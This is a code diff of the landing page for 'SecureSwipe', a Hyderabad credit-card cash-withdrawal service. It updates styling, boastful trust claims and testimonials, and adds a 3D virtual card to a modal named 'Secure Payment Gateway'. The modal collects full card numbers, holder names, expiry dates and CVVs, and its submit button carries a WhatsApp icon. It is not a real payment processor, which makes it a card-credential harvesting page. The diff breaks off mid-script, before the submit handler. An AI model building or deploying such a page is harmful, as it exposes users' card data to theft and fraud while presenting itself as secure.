@@ -7,15 +7,14 @@
     <!-- Bootstrap 5 CSS -->
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
     <!-- Premium Fonts -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@700;800&display=swap" rel="stylesheet">
-    <!-- Font Awesome -->
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@700;800&family=Source+Code+Pro:wght@500&display=swap" rel="stylesheet">
+    <!-- Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     
     <style>
         :root {
             --brand-primary: #0f172a;
             --brand-accent: #2563eb;
-            --brand-success: #10b981;
             --brand-warning: #f59e0b;
             --surface-50: #f8fafc;
             --surface-100: #f1f5f9;
@@ -29,145 +28,110 @@
             background-color: #ffffff;
             -webkit-font-smoothing: antialiased;
             overflow-x: hidden;
-            margin: 0;
-            padding: 0;
+            margin: 0; padding: 0;
         }
 
-        h1, h2, h3, h4, .navbar-brand {
-            font-family: 'Plus Jakarta Sans', sans-serif;
-            letter-spacing: -0.02em;
-        }
+        h1, h2, h3, h4, .navbar-brand { font-family: 'Plus Jakarta Sans', sans-serif; letter-spacing: -0.02em; }
 
-        /* Clean Fixed Navbar */
+        /* Navigation */
         .navbar {
-            padding: 1.25rem 0;
+            padding: 1.1rem 0;
             background: rgba(255, 255, 255, 0.9) !important;
             backdrop-filter: blur(12px);
             border-bottom: 1px solid var(--surface-100);
             z-index: 1060;
         }
 
-        /* Hero Styling */
+        /* Hero */
         .hero-section {
-            padding: 140px 0 60px;
+            padding: 130px 0 60px;
             background: radial-gradient(circle at 100% 0%, #eff6ff 0%, #ffffff 60%);
         }
 
         .hyd-badge {
-            background: #fffbeb;
-            color: #b45309;
-            padding: 8px 16px;
-            border-radius: 100px;
-            font-weight: 700;
-            font-size: 11px;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-            display: inline-flex;
-            align-items: center;
-            border: 1px solid #fef3c7;
-            margin-bottom: 1.5rem;
+            background: #fffbeb; color: #b45309; padding: 6px 14px; border-radius: 100px;
+            font-weight: 700; font-size: 11px; text-transform: uppercase; border: 1px solid #fef3c7; margin-bottom: 1.5rem;
+            display: inline-flex; align-items: center;
         }
 
-        /* FIXED: Promo Card with Equal Button Sizes */
+        /* Promo Card */
         .promo-card {
-            background: var(--brand-primary);
-            border-radius: 32px;
-            padding: 40px 30px;
-            color: white;
-            box-shadow: 0 30px 60px -12px rgba(15, 23, 42, 0.4);
-            text-align: center;
-            position: relative;
-            overflow: hidden;
+            background: var(--brand-primary); border-radius: 32px; padding: 45px 30px; color: white;
+            box-shadow: 0 30px 60px -12px rgba(15, 23, 42, 0.4); text-align: center; position: relative;
         }
 
-        .main-rate {
-            font-size: 5rem;
-            font-weight: 800;
-            color: var(--brand-warning);
-            line-height: 1;
-            margin: 10px 0;
-        }
+        .main-rate-display { font-size: 5rem; font-weight: 800; color: var(--brand-warning); line-height: 1; margin: 10px 0; }
 
         .dialogue-bubble {
-            background: rgba(255, 255, 255, 0.07);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            border-radius: 20px;
-            padding: 24px;
-            margin: 25px 0;
-            font-size: 1.05rem;
-            line-height: 1.5;
+            background: rgba(255, 255, 255, 0.07); border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px; padding: 24px; margin: 25px 0; font-size: 1.05rem; line-height: 1.5;
         }
 
-        /* Equal Size Buttons Fix */
-        .promo-button-container {
-            display: flex;
-            gap: 12px;
-            width: 100%;
+        .promo-btn-group { display: flex; gap: 12px; width: 100%; }
+        .btn-promo {
+            flex: 1; height: 60px; border-radius: 16px; font-weight: 700; text-decoration: none;
+            display: flex; align-items: center; justify-content: center; transition: 0.2s; font-size: 0.95rem; border: none;
+        }
+        .btn-promo-wa { background: #ffffff; color: #25d366; }
+        .btn-promo-call { background: var(--brand-warning); color: #000; }
+
+        /* 3D VIRTUAL CARD STYLES */
+        .card-container {
+            perspective: 1000px; width: 100%; max-width: 380px; margin: 0 auto 30px; height: 230px;
         }
 
-        .btn-promo-action {
-            flex: 1; /* Ensures both take 50% space */
-            padding: 16px;
-            border-radius: 16px;
-            font-weight: 700;
-            text-decoration: none;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            transition: all 0.2s ease;
-            border: none;
+        .card-inner {
+            position: relative; width: 100%; height: 100%;
+            transition: transform 0.6s cubic-bezier(0.4, 0, 0.2, 1); transform-style: preserve-3d;
         }
 
-        .btn-wa-light { background: #ffffff; color: #25d366; }
-        .btn-call-gold { background: var(--brand-warning); color: #000; }
+        .card-container.flipped .card-inner { transform: rotateY(180deg); }
 
-        /* Standard Rate Cards */
-        .rate-option-card {
-            background: white;
-            border: 1px solid var(--surface-100);
-            border-radius: 28px;
-            padding: 30px 20px;
-            text-align: center;
-            transition: all 0.3s ease;
-            text-decoration: none;
-            color: inherit;
-            display: block;
+        .card-front, .card-back {
+            position: absolute; width: 100%; height: 100%; backface-visibility: hidden;
+            border-radius: 18px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); color: #fff;
+            padding: 25px; background: linear-gradient(135deg, #1e293b 0%, #0f172a 100%); overflow: hidden;
         }
 
-        .rate-option-card:hover {
-            border-color: var(--brand-accent);
-            transform: translateY(-8px);
-            box-shadow: 0 20px 30px -10px rgba(0,0,0,0.05);
+        .card-back { transform: rotateY(180deg); background: #1e293b; padding: 0; }
+        .chip { width: 50px; height: 40px; background: linear-gradient(135deg, #fde68a 0%, #f59e0b 100%); border-radius: 8px; margin-bottom: 20px; position: relative; }
+        .chip::after { content: ''; position: absolute; top: 10px; left: 10px; right: 10px; bottom: 10px; border: 1px solid rgba(0,0,0,0.1); }
+        .contactless { position: absolute; top: 30px; right: 25px; opacity: 0.6; font-size: 1.5rem; }
+        .card-number-display { font-family: 'Source Code Pro', monospace; font-size: 1.4rem; letter-spacing: 3px; margin-bottom: 25px; display: block; text-shadow: 2px 2px 2px rgba(0,0,0,0.3); }
+        .card-info-row { display: flex; justify-content: space-between; align-items: flex-end; }
+        .label-small { font-size: 8px; text-transform: uppercase; opacity: 0.7; letter-spacing: 1px; margin-bottom: 2px; }
+        .value-text { font-size: 14px; font-weight: 600; text-transform: uppercase; }
+        .magnetic-strip { width: 100%; height: 45px; background: #000; margin-top: 30px; }
+        .signature-bar { width: 80%; height: 35px; background: #fff; margin: 20px auto 0 20px; display: flex; align-items: center; justify-content: flex-end; padding-right: 10px; border-radius: 4px; }
+        .cvv-display { color: #000; font-family: 'Source Code Pro', monospace; font-weight: 700; font-style: italic; }
+
+        /* Section Visuals */
+        .img-satisfaction { width: 100%; height: auto; border-radius: 32px; box-shadow: 0 20px 40px rgba(0,0,0,0.1); }
+        
+        .process-img { width: 100%; height: 180px; border-radius: 24px; object-fit: cover; margin-bottom: 20px; background: var(--surface-100); }
+        .step-num { width: 32px; height: 32px; background: var(--brand-accent); color: white; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 800; margin: 0 auto 15px; font-size: 0.8rem; }
+
+        .testimonial-card { 
+            background: var(--surface-50); border-radius: 28px; padding: 35px; border: 1px solid var(--surface-100); 
+            height: 100%; text-align: center; transition: 0.3s ease;
         }
+        .testimonial-card:hover { transform: translateY(-5px); border-color: var(--brand-accent); box-shadow: 0 15px 30px rgba(0,0,0,0.05); }
+        .client-avatar { width: 75px; height: 75px; border-radius: 50%; object-fit: cover; margin-bottom: 15px; border: 4px solid #fff; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
 
-        .rate-option-card .value { font-size: 2.5rem; font-weight: 800; color: var(--brand-accent); }
-
-        /* Human Touch: Process & Reviews */
-        .process-img { width: 100%; height: 180px; border-radius: 24px; object-fit: cover; margin-bottom: 20px; }
-        .step-circle { width: 32px; height: 32px; background: var(--brand-accent); color: white; border-radius: 8px; display: flex; align-items: center; justify-content: center; font-weight: 800; margin: 0 auto 15px; }
-
-        .testimonial-card { background: var(--surface-50); border-radius: 28px; padding: 35px; border: 1px solid var(--surface-100); height: 100%; }
-        .client-avatar { width: 64px; height: 64px; border-radius: 50%; object-fit: cover; margin-bottom: 15px; border: 3px solid #fff; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-
-        /* Footer Cleanup */
-        .site-footer {
-            background: var(--brand-primary);
-            color: #94a3b8;
-            padding: 80px 0 40px;
-            margin-top: 0;
-            border-top: 1px solid rgba(255,255,255,0.05);
-        }
+        /* Footer */
+        .site-footer { background: var(--brand-primary); color: #cbd5e1; padding: 70px 0 60px; border-top: 1px solid rgba(255,255,255,0.05); }
 
         /* Modal styling */
         .modal-content { border-radius: 32px; border: none; overflow: hidden; }
-        .calc-box { background: var(--brand-accent); color: white; border-radius: 20px; padding: 20px; margin-top: 20px; }
+        .calc-panel { background: var(--brand-accent); color: white; border-radius: 20px; padding: 20px; margin-top: 20px; }
 
         @media (max-width: 768px) {
             .hero-section { padding: 100px 0 40px; }
-            .display-3 { font-size: 2.3rem; }
-            .main-rate { font-size: 3.8rem; }
-            .promo-button-container { flex-direction: column; }
-            .promo-card { padding: 35px 20px; }
+            .display-3 { font-size: 2.2rem; }
+            .main-rate-display { font-size: 3.5rem; }
+            .promo-btn-group { flex-direction: column; }
+            .card-container { height: 200px; max-width: 320px; }
+            .card-number-display { font-size: 1.1rem; }
         }
     </style>
 </head>
@@ -177,14 +141,14 @@
     <nav class="navbar navbar-expand-lg fixed-top">
         <div class="container px-4">
             <a class="navbar-brand d-flex align-items-center" href="#">
-                <div class="bg-primary text-white p-2 rounded-3 me-2" style="width: 34px; height: 34px; display: flex; align-items: center; justify-content: center;">
-                    <i class="fas fa-bolt fa-xs"></i>
+                <div class="bg-primary text-white p-2 rounded-3 me-2" style="width: 36px; height: 36px; display: flex; align-items: center; justify-content: center;">
+                    <i class="fas fa-bolt fa-sm"></i>
                 </div>
-                <span class="fw-800 fs-5">Secure<span class="text-primary">Swipe</span></span>
+                <span class="fw-800 fs-5 text-dark">Secure<span class="text-primary">Swipe</span></span>
             </a>
-            <div class="d-none d-lg-block">
-                <span class="text-muted small fw-700 me-3"><i class="fas fa-location-dot text-danger"></i> Serving Hyderabad & Secunderabad</span>
-                <a href="tel:+919866783703" class="btn btn-primary btn-sm rounded-pill px-4 fw-700 shadow-sm">Talk to Agent</a>
+            <div class="ms-auto d-flex align-items-center gap-3">
+                <span class="d-none d-md-block text-muted small fw-600"><i class="fas fa-location-dot text-danger"></i> Trusted Hyderabad Support</span>
+                <a href="tel:+919866783703" class="btn btn-primary btn-sm rounded-pill px-4 fw-700 shadow-sm">Contact Now</a>
             </div>
         </div>
     </nav>
@@ -195,37 +159,33 @@
             <div class="row align-items-center">
                 <div class="col-lg-6 text-center text-lg-start mb-5 mb-lg-0">
                     <div class="hyd-badge">
-                        <i class="fas fa-heart me-2 text-danger"></i> Trusted by 10,000+ Happy Customers
+                        <i class="fas fa-heart me-2 text-danger"></i> No.1 Ranked in Hyderabad
                     </div>
-                    <h1 class="display-3 fw-800 mb-4">Hyderabad's Trusted <br class="d-none d-lg-block"> Credit Card Service.</h1>
+                    <h1 class="display-3 fw-800 mb-4">Hyderabad's Trusted Credit Card Service.</h1>
                     <p class="text-muted fs-5 mb-5 mx-auto mx-lg-0" style="max-width: 520px;">
-                        Professional, safe, and immediate card solutions with same-day settlement. We help you manage your cash flow with zero hassle.
+                        Immediate cash liquidity with 100% security. Join thousands of happy Hyderabadis managing their cash flow daily.
                     </p>
                     <div class="d-none d-lg-flex align-items-center gap-3">
-                         <img src="https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=400&q=80" class="rounded-4 shadow-lg" style="width: 150px; height: 80px; object-fit: cover;">
-                         <span class="fw-800 text-primary small">Professional Financial Support</span>
+                         <img src="https://images.unsplash.com/photo-1556740714-a8395b3bf30f?w=400&q=80" class="rounded-4 shadow-lg" style="width: 120px; height: 70px; object-fit: cover;" alt="Trusted Agent">
+                         <span class="fw-800 text-primary small">Trusted Local Partner</span>
                     </div>
                 </div>
 
                 <div class="col-lg-6">
-                    <!-- The Heart Card -->
                     <div class="promo-card">
-                        <div class="text-uppercase small fw-800 tracking-wider opacity-50 mb-1" style="font-size: 10px;">Immediate Bank Settlement</div>
+                        <div class="text-uppercase small fw-800 tracking-wider opacity-50 mb-1" style="font-size: 10px;">Immediate Settlement Guaranteed</div>
                         <h2 class="h5 fw-800 mt-2 mb-0">Withdrawals & Bill Payments</h2>
-                        <div class="main-rate">2.5%</div>
-                        
+                        <div class="main-rate-display">2.5%</div>
                         <div class="dialogue-bubble">
                             "Why worry about card payments? 💳 <br>
                             <strong>We're here for you!</strong> We pay your bills & you withdraw instantly at just <strong>2.5%</strong>." 🚀
                         </div>
-
-                        <!-- Same Size Buttons Grid -->
-                        <div class="promo-button-container">
-                            <a href="https://wa.me/919866783703" class="btn-promo-action btn-wa-light">
-                                <i class="fab fa-whatsapp me-2"></i> WhatsApp Now
+                        <div class="promo-btn-group">
+                            <a href="https://wa.me/919866783703" class="btn-promo btn-promo-wa shadow-sm">
+                                <i class="fab fa-whatsapp me-2"></i> WhatsApp
                             </a>
-                            <a href="tel:+919866783703" class="btn-promo-action btn-call-gold">
-                                <i class="fas fa-phone-alt me-2"></i> Call Support
+                            <a href="tel:+919866783703" class="btn-promo btn-promo-call shadow-sm">
+                                <i class="fas fa-phone-alt me-2"></i> Call Now
                             </a>
                         </div>
                     </div>
@@ -237,13 +197,13 @@
     <!-- Satisfaction visual -->
     <section class="py-5">
         <div class="container px-4">
-            <div class="row align-items-center g-5">
+            <div class="row align-items-center g-5 text-center text-md-start">
                 <div class="col-md-6 order-md-2">
-                    <img src="https://images.unsplash.com/photo-1600880212319-784439767b31?q=80&w=800" class="img-fluid rounded-5 shadow-xl" alt="Happy Clients">
+                    <img src="https://images.unsplash.com/photo-1556742044-3c52d6e88c62?w=800&q=80" class="img-satisfaction" alt="Happy Customer">
                 </div>
-                <div class="col-md-6 text-center text-md-start">
-                    <h2 class="fw-800 mb-4">Fast Cash for Happy Faces.</h2>
-                    <p class="text-muted fs-5">We bridge your card limits to bank cash within minutes. No more worrying about monthly payments or urgent liquidity. Join 5000+ satisfied business owners in Hyderabad.</p>
+                <div class="col-md-6">
+                    <h2 class="fw-800 mb-4 text-brand-primary">Fast Cash for Happy Faces. 😊</h2>
+                    <p class="text-muted fs-5">Get immediate liquidity from your credit card without any long procedures. Join thousands of satisfied Hyderabad business owners today.</p>
                 </div>
             </div>
         </div>
@@ -251,60 +211,58 @@
 
     <!-- Standard Rates -->
     <section class="py-5 bg-light rounded-5 mx-2 mx-lg-5">
-        <div class="container px-4">
-            <div class="text-center mb-5">
-                <h3 class="fw-800">Standard Swipe Rates</h3>
-                <p class="text-muted small">No hidden charges. Instant settlement guaranteed.</p>
-            </div>
+        <div class="container px-4 text-center">
+            <h3 class="fw-800 mb-1">Standard Swipe Rates</h3>
+            <p class="text-muted small mb-5">Clear charges. Instant bank transfer.</p>
             <div class="row g-3 justify-content-center">
                 <div class="col-6 col-md-5 col-lg-4">
-                    <a href="#" class="rate-option-card" data-bs-toggle="modal" data-bs-target="#swipeModal" data-card-type="VISA & RUPAY" data-percent="1.7">
-                        <img src="https://img.icons8.com/color/96/visa.png" width="48" class="mb-2">
-                        <div class="small fw-800 text-muted opacity-50">VISA & RUPAY</div>
-                        <div class="value">1.7%</div>
-                        <div class="text-primary fw-700 small mt-2">Start Processing <i class="fas fa-arrow-right ms-1"></i></div>
-                    </a>
+                    <div class="bg-white border rounded-4 p-4 text-center shadow-sm cursor-pointer hover-lift" data-bs-toggle="modal" data-bs-target="#swipeModal" data-card-type="VISA & RUPAY" data-percent="1.7" style="cursor: pointer;">
+                        <img src="https://img.icons8.com/color/96/visa.png" width="48" alt="Visa">
+                        <div class="small fw-800 text-muted opacity-50 mt-1">VISA & RUPAY</div>
+                        <div class="h2 fw-800 text-primary my-2">1.7%</div>
+                        <div class="text-primary fw-700 small">Start <i class="fas fa-arrow-right ms-1"></i></div>
+                    </div>
                 </div>
                 <div class="col-6 col-md-5 col-lg-4">
-                    <a href="#" class="rate-option-card" data-bs-toggle="modal" data-bs-target="#swipeModal" data-card-type="MASTERCARD" data-percent="2.0">
-                        <img src="https://img.icons8.com/color/96/mastercard.png" width="48" class="mb-2">
-                        <div class="small fw-800 text-muted opacity-50">MASTERCARD</div>
-                        <div class="value">2.0%</div>
-                        <div class="text-primary fw-700 small mt-2">Start Processing <i class="fas fa-arrow-right ms-1"></i></div>
-                    </a>
+                    <div class="bg-white border rounded-4 p-4 text-center shadow-sm cursor-pointer hover-lift" data-bs-toggle="modal" data-bs-target="#swipeModal" data-card-type="MASTERCARD" data-percent="2.0" style="cursor: pointer;">
+                        <img src="https://img.icons8.com/color/96/mastercard.png" width="48" alt="Mastercard">
+                        <div class="small fw-800 text-muted opacity-50 mt-1">MASTERCARD</div>
+                        <div class="h2 fw-800 text-primary my-2">2.0%</div>
+                        <div class="text-primary fw-700 small">Start <i class="fas fa-arrow-right ms-1"></i></div>
+                    </div>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- Process -->
+    <!-- Professional Process -->
     <section class="py-5 mt-5">
         <div class="container px-4 text-center">
-            <h4 class="fw-800 mb-5">Simple 4-Step Process</h4>
+            <h4 class="fw-800 mb-5">Professional 4-Step Process</h4>
             <div class="row g-4">
                 <div class="col-6 col-lg-3">
-                    <img src="https://images.unsplash.com/photo-1556740738-b6a63e27c4df?w=400&q=80" class="process-img shadow-sm" alt="Talk to us">
-                    <div class="step-circle">1</div>
+                    <img src="https://images.unsplash.com/photo-1556740738-b6a63e27c4df?w=400&q=80" class="process-img shadow-sm" alt="Consultation">
+                    <div class="step-num">1</div>
                     <h6 class="fw-800">Consult</h6>
-                    <p class="small text-muted">Local support</p>
+                    <p class="small text-muted">Talk to Local Rep</p>
                 </div>
                 <div class="col-6 col-lg-3">
                     <img src="https://images.unsplash.com/photo-1554224155-8d04cb21cd6c?w=400&q=80" class="process-img shadow-sm" alt="Verify">
-                    <div class="step-circle">2</div>
+                    <div class="step-num">2</div>
                     <h6 class="fw-800">Verify</h6>
-                    <p class="small text-muted">Instant check</p>
+                    <p class="small text-muted">Quick Documentation</p>
                 </div>
                 <div class="col-6 col-lg-3">
-                    <img src="https://images.unsplash.com/photo-1556740758-90de374c12ad?w=400&q=80" class="process-img shadow-sm" alt="Card Swipe">
-                    <div class="step-circle">3</div>
+                    <img src="https://images.unsplash.com/photo-1556740758-90de374c12ad?w=400&q=80" class="process-img shadow-sm" alt="Swipe">
+                    <div class="step-num">3</div>
                     <h6 class="fw-800">Swipe</h6>
-                    <p class="small text-muted">Authorized POS</p>
+                    <p class="small text-muted">Authorized Terminal</p>
                 </div>
                 <div class="col-6 col-lg-3">
                     <img src="https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=400&q=80" class="process-img shadow-sm" alt="Receive Cash">
-                    <div class="step-circle">4</div>
+                    <div class="step-num">4</div>
                     <h6 class="fw-800">Receive</h6>
-                    <p class="small text-muted">IMPS Settlement</p>
+                    <p class="small text-muted">Immediate Settlement</p>
                 </div>
             </div>
         </div>
@@ -313,30 +271,30 @@
     <!-- Reviews -->
     <section class="py-5">
         <div class="container px-4">
-            <h4 class="fw-800 text-center mb-5">Trusted by Hyderabad Customers</h4>
+            <h4 class="fw-800 text-center mb-5">Hyderabad Customer Stories</h4>
             <div class="row g-4">
                 <div class="col-md-4">
                     <div class="testimonial-card">
-                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=100&q=80" class="client-avatar" alt="Ravi">
+                        <img src="https://images.unsplash.com/photo-1507003211169-0a1dd7228f2d?w=150&h=150&fit=crop" class="client-avatar" alt="Reviewer">
                         <div class="text-warning mb-2 small"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-                        <p class="small text-muted mb-3">"Polished and fast. Best swipe rates in Kukatpally. Settlement was instant and the staff was very professional."</p>
-                        <h6 class="fw-800 mb-0 small text-primary">Ravi – Kukatpally</h6>
+                        <p class="small text-muted mb-0">"Excellent service in Kukatpally. Settlement was instant and professional. Best rates I found in the city."</p>
+                        <h6 class="fw-800 small mt-3 mb-0 text-primary">Ravi – Kukatpally</h6>
                     </div>
                 </div>
                 <div class="col-md-4">
                     <div class="testimonial-card">
-                        <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=100&q=80" class="client-avatar" alt="Imran">
+                        <img src="https://images.unsplash.com/photo-1500648767791-00dcc994a43e?w=150&h=150&fit=crop" class="client-avatar" alt="Reviewer">
                         <div class="text-warning mb-2 small"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-                        <p class="small text-muted mb-3">"Discrete and professional. Same day settlement guaranteed in Tolichowki. Very satisfied with the quick cash flow."</p>
-                        <h6 class="fw-800 mb-0 small text-primary">Imran – Tolichowki</h6>
+                        <p class="small text-muted mb-0">"Reliable for business needs. Their 2.5% bill payment service is a lifesaver for managing cash flow."</p>
+                        <h6 class="fw-800 small mt-3 mb-0 text-primary">Imran – Tolichowki</h6>
                     </div>
                 </div>
                 <div class="col-md-4">
                     <div class="testimonial-card">
-                        <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=100&q=80" class="client-avatar" alt="Suresh">
+                        <img src="https://images.unsplash.com/photo-1472099645785-5658abf4ff4e?w=150&h=150&fit=crop" class="client-avatar" alt="Reviewer">
                         <div class="text-warning mb-2 small"><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i></div>
-                        <p class="small text-muted mb-3">"2.5% flat rate is perfect for my business bills. Great support in LB Nagar area. I highly recommend them."</p>
-                        <h6 class="fw-800 mb-0 small text-primary">Suresh – LB Nagar</h6>
+                        <p class="small text-muted mb-0">"Quick and honest. I use them regularly for my urgent liquidity needs. Highly recommended."</p>
+                        <h6 class="fw-800 small mt-3 mb-0 text-primary">Suresh – LB Nagar</h6>
                     </div>
                 </div>
             </div>
@@ -348,29 +306,66 @@
         <div class="container px-4 text-center text-md-start">
             <div class="row g-5 align-items-center">
                 <div class="col-md-6">
-                    <div class="text-white fw-800 fs-4 mb-3">SecureSwipe <span class="text-primary">HYD</span></div>
-                    <p class="small" style="max-width: 420px; color: #64748b;">
-                        The premier Credit Card bridge service in Hyderabad. Serving all major zones including Banjara Hills, Jubilee Hills, Gachibowli, and Secunderabad.
+                    <div class="footer-logo">SecureSwipe <span class="text-primary">HYD</span></div>
+                    <p class="small" style="max-width: 420px; color: #94a3b8;">
+                        Professional Credit Card bridge service. Serving Banjara Hills, Jubilee Hills, Gachibowli, Secunderabad, and more.
                     </p>
                 </div>
                 <div class="col-md-6 text-md-end">
-                    <div class="mb-2 text-white">Direct Support: <span class="fw-800">+91 98667 83703</span></div>
-                    <p class="small text-muted mb-0">All services subject to bank rules & local regulations.</p>
-                    <p class="small text-muted mt-3">&copy; 2025 SecureSwipe Hyderabad. All rights reserved.</p>
+                    <div class="mb-2 text-white fw-700">Support: +91 98667 83703</div>
+                    <p class="small text-muted">&copy; 2025 SecureSwipe Hyderabad. All rights reserved.</p>
                 </div>
             </div>
         </div>
     </footer>
 
-    <!-- Processing Modal -->
+    <!-- INTERACTIVE 3D MODAL -->
     <div class="modal fade" id="swipeModal" tabindex="-1">
-        <div class="modal-dialog modal-dialog-centered mx-3">
+        <div class="modal-dialog modal-dialog-centered">
             <div class="modal-content shadow-lg border-0">
                 <div class="modal-header px-4 py-3 bg-primary text-white border-0">
-                    <h6 class="modal-title fw-800">Secure Payment Request</h6>
+                    <h6 class="modal-title fw-800">Secure Payment Gateway</h6>
                     <button type="button" class="btn-close btn-close-white" data-bs-dismiss="modal"></button>
                 </div>
                 <div class="modal-body p-4">
+                    
+                    <!-- VIRTUAL 3D CARD -->
+                    <div class="card-container" id="virtualCard">
+                        <div class="card-inner">
+                            <!-- FRONT -->
+                            <div class="card-front">
+                                <i class="fas fa-wifi contactless"></i>
+                                <div class="chip"></div>
+                                <div class="card-number-display" id="cardDisplayNumber">#### #### #### ####</div>
+                                <div class="card-info-row">
+                                    <div class="flex-grow-1">
+                                        <div class="label-small">Card Holder</div>
+                                        <div class="value-text" id="cardDisplayName">Full Name</div>
+                                    </div>
+                                    <div class="ms-3">
+                                        <div class="label-small">Expires</div>
+                                        <div class="value-text" id="cardDisplayExpiry">MM/YY</div>
+                                    </div>
+                                    <div class="ms-4">
+                                        <img src="https://img.icons8.com/color/48/visa.png" id="cardDisplayLogo" width="45">
+                                    </div>
+                                </div>
+                            </div>
+                            <!-- BACK -->
+                            <div class="card-back">
+                                <div class="magnetic-strip"></div>
+                                <div class="label-small mt-3 ms-4" style="color:white">Authorized Signature</div>
+                                <div class="signature-bar">
+                                    <div class="cvv-display" id="cardDisplayCVV">***</div>
+                                </div>
+                                <div class="p-4 small opacity-50" style="font-size: 10px;">
+                                    This virtual representation is for processing your immediate transaction with SecureSwipe Hyderabad.
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <!-- FORM -->
                     <form id="whatsappForm">
                         <input type="hidden" id="selectedCardType">
                         <input type="hidden" id="selectedPercent">
@@ -379,26 +374,32 @@
                             <label class="form-label small fw-800 text-muted">Amount to Withdraw (₹)</label>
                             <input type="number" id="withdrawAmount" class="form-control" placeholder="e.g. 10000" required>
                         </div>
-                        <div class="mb-3" id="brandContainer">
-                            <label class="form-label small fw-800 text-muted">Select Brand</label>
-                            <select id="cardBrand" class="form-select"><option value="VISA">VISA</option><option value="RUPAY">RUPAY</option></select>
+                        <div class="mb-3">
+                            <label class="form-label small fw-800 text-muted">Account Holder Name</label>
+                            <input type="text" id="holderName" class="form-control" placeholder="Name on Card" required>
                         </div>
                         <div class="mb-3">
                             <label class="form-label small fw-800 text-muted">Card Number</label>
                             <input type="text" id="cardNum" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19" required>
                         </div>
                         <div class="row g-2 mb-3">
-                            <div class="col-6"><label class="form-label small fw-800 text-muted">Expiry</label><input type="text" id="expiry" class="form-control" placeholder="MM/YY" maxlength="5" required></div>
-                            <div class="col-6"><label class="form-label small fw-800 text-muted">CVV</label><input type="password" id="cvv" class="form-control" placeholder="123" maxlength="3" required></div>
+                            <div class="col-6">
+                                <label class="form-label small fw-800 text-muted">Expiry</label>
+                                <input type="text" id="expiry" class="form-control" placeholder="MM/YY" maxlength="5" required>
+                            </div>
+                            <div class="col-6">
+                                <label class="form-label small fw-800 text-muted">CVV</label>
+                                <input type="password" id="cvv" class="form-control" placeholder="123" maxlength="3" required>
+                            </div>
                         </div>
 
-                        <div class="calc-box" id="calcSection">
-                            <div class="d-flex justify-content-between mb-1 small"><span>Principal:</span><span id="dispAmount">₹0</span></div>
+                        <div class="calc-panel" id="calcSection">
+                            <div class="d-flex justify-content-between mb-1 small"><span>Amount:</span><span id="dispAmount">₹0</span></div>
                             <div class="d-flex justify-content-between mb-2 small opacity-75"><span id="dispChargeLabel">Fee (0%):</span><span id="dispFee">₹0</span></div>
-                            <div class="d-flex justify-content-between fw-800 fs-5 border-top border-white border-opacity-25 pt-2"><span>Net Settlement:</span><span id="dispNet">₹0</span></div>
+                            <div class="d-flex justify-content-between fw-800 fs-5 border-top border-white border-opacity-25 pt-2"><span>Settlement:</span><span id="dispNet">₹0</span></div>
                         </div>
 
-                        <button type="submit" class="btn btn-primary w-100 py-3 mt-4 rounded-3 fw-700 shadow">Complete on WhatsApp <i class="fab fa-whatsapp ms-2"></i></button>
+                        <button type="submit" class="btn btn-primary w-100 py-3 mt-4 rounded-3 fw-700 shadow">Process Request <i class="fab fa-whatsapp ms-2"></i></button>
                     </form>
                 </div>
             </div>
@@ -407,17 +408,47 @@
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        // Form Masks
-        document.getElementById('cardNum').addEventListener('input', (e) => {
-            e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
-        });
-        document.getElementById('expiry').addEventListener('input', (e) => {
-            let v = e.target.value.replace(/\D/g, '');
-            if(v.length >= 2) e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4);
-            else e.target.value = v;
+        // FORM MASKS & LIVE SYNC
+        const inputNum = document.getElementById('cardNum');
+        const inputName = document.getElementById('holderName');
+        const inputExpiry = document.getElementById('expiry');
+        const inputCVV = document.getElementById('cvv');
+        const virtualCard = document.getElementById('virtualCard');
+
+        // Sync Number
+        inputNum.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+            e.target.value = val;
+            document.getElementById('cardDisplayNumber').innerText = val || "#### #### #### ####";
+            
+            // Logo Logic
+            const logo = document.getElementById('cardDisplayLogo');
+            if (val.startsWith('4')) logo.src = "https://img.icons8.com/color/48/visa.png";
+            else if (val.startsWith('5')) logo.src = "https://img.icons8.com/color/48/mastercard.png";
+            else logo.src = "https://img.icons8.com/color/48/bank-card-back-side.png";
         });
 
-        // Calculator
+        // Sync Name
+        inputName.addEventListener('input', (e) => {
+            document.getElementById('cardDisplayName').innerText = e.target.value || "Full Name";
+        });
+
+        // Sync Expiry
+        inputExpiry.addEventListener('input', (e) => {
+            let val = e.target.value.replace(/\D/g, '');
+            if(val.length >= 2) e.target.value = val.substring(0, 2) + '/' + val.substring(2, 4);
